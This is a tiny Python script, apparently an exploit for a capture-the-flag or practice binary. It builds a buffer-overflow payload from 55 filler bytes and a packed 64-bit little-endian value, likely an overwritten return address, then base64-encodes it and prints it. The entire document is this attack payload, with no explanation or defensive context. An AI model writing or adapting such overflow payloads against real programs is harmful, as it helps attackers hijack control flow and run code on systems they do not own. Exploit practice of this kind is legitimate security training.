
import sys
import struct
import base64

buf = b'VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV'
buf += struct.pack('<Q', 4697314549422738596)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
